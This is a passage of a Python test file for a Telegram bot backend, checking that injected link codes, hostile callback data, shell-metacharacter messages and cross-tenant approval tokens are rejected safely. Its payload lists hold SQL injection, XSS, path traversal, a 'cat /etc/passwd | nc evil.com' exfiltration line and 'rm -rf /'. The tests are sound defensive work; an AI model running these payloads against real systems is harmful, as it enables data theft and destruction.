        "'; UPDATE users SET role='owner'; --",
        "' UNION SELECT id, email, password_hash FROM users --",
        '"><script>alert(1)</script>',
    ]

    for idx, bad_input in enumerate(malicious_inputs):
        update_id = 9000 + idx
        upd = _make_text_update(
            update_id=update_id,
            text=f"/link {bad_input}",
            user_id=88009,
            chat_id=88009,
        )
        res = process_update(db_session, clock, upd, client=tg_client)
        assert res.action == "link_failed_LINK_CODE_INVALID"
        assert "Invalid link code" in mock_tg.calls[-1]["body"]["text"]

    # Invariant: channel_links and users tables remain uncorrupted
    assert db_session.scalar(select(func.count(ChannelLink.id))) >= 0
    assert db_session.scalar(select(func.count(User.id))) >= 0


def test_security_malformed_callback_data_resilience(
    db_session: Session,
    clock: FrozenClock,
) -> None:
    """Penetration: Malformed or hostile callback query data strings do not crash the service."""
    mock_tg = MockTelegramHandler()
    tg_client = TelegramClient(token="BOT_TEST", transport=httpx.MockTransport(mock_tg.handle))

    hostile_callbacks = [
        "",  # Empty string
        "act:",  # Missing token payload
        "act:" + "A" * 8192,  # Oversized buffer
        "act:../../../../etc/passwd",  # Path traversal attempt
        "act:' OR 1=1 --",  # SQL injection attempt
        'act:{"action": "grant_all"}',  # JSON payload injection
        "random_unknown_prefix_data",  # Unknown button callback
    ]

    for idx, cb_data in enumerate(hostile_callbacks):
        update_id = 9100 + idx
        upd = _make_callback_query_update(
            update_id=update_id,
            callback_data=cb_data,
            user_id=88010,
            chat_id=88010,
        )
        # Service must not raise unhandled exceptions
        res = process_update(db_session, clock, upd, client=tg_client)
        assert res.status == "processed"
        assert res.action in ("approval_failed", "callback_query")


def test_security_command_injection_heuristics_safe(
    db_session: Session,
    clock: FrozenClock,
) -> None:
    """Penetration: Inbound message texts with shell metacharacters are safely handled as text."""
    ws, _, link = _setup_linked_owner(db_session, clock, channel_user_id="88011")

    mock_tg = MockTelegramHandler()
    tg_client = TelegramClient(token="BOT_TEST", transport=httpx.MockTransport(mock_tg.handle))

    shell_payloads = [
        "$(whoami)",
        "; cat /etc/passwd | nc evil.com 1337 &",
        "`rm -rf /`",
        "|| ping -c 3 127.0.0.1 ||",
        "eval(compile('import os; os.system(\"id\")', '<string>', 'exec'))",
    ]

    for idx, payload in enumerate(shell_payloads):
        update_id = 9200 + idx
        upd = _make_text_update(
            update_id=update_id,
            text=payload,
            user_id=int(link.channel_user_id),
            chat_id=int(link.channel_chat_id),
        )
        res = process_update(db_session, clock, upd, client=tg_client)
        assert res.status == "processed"
        # Safely handled without command execution or system breach
        assert res.action in ("owner_command", "agent_task")


@pytest.mark.invariant("INV-19")
def test_security_cross_workspace_token_isolation(
    db_session: Session,
    clock: FrozenClock,
) -> None:
    """Case 9: Action tokens from Workspace A cannot be consumed or manipulated by Workspace B."""
    ws_a, owner_a, link_a = _setup_linked_owner(
        db_session, clock, channel_user_id="88012", name="Tenant A"
    )
    ws_b, owner_b, link_b = _setup_linked_owner(
        db_session, clock, channel_user_id="88013", name="Tenant B"
    )

    set_tenant_context(db_session, ws_a.id)
    ctx_a = WorkspaceContext(
        workspace_id=ws_a.id,
        actor=ActorRef.user(owner_a.id),
        role="owner",
        timezone=ws_a.timezone,
        locale="tr",
        is_demo=False,
    )

    approval_a = approvals_service.request(
        db_session,
        clock,
        ctx_a,
        kind="confirmation",
        action="command.update_fact",
        subject_type="owner_command",
        subject_id=uuid.uuid4(),
        subject_version=1,
        payload={"field": "hours"},
        summary={"label": "Tenant A fact"},
        required_permission="knowledge.verify",
        expires_at=clock.now() + timedelta(hours=2),
    )
    db_session.flush()

    token_a = ActionTokenService.create_action_token(
        db_session, clock, ctx_a, approval_a, decision="approved", user_id=owner_a.id
    )
    db_session.flush()

    mock_tg = MockTelegramHandler()
    tg_client = TelegramClient(token="BOT_TEST", transport=httpx.MockTransport(mock_tg.handle))

    # Tenant B tries to decide Tenant A's approval token
    upd_cross = _make_callback_query_update(
        update_id=9301,
        callback_data=f"act:{token_a}",
        user_id=int(link_b.channel_user_id),
        chat_id=int(link_b.channel_chat_id),
    )
    res_cross = process_update(db_session, clock, upd_cross, client=tg_client)

    assert res_cross.action == "approval_unauthorized"
    assert approval_a.status == "pending"
    assert "yetkiniz yok / Unauthorized" in mock_tg.calls[-1]["body"]["text"]
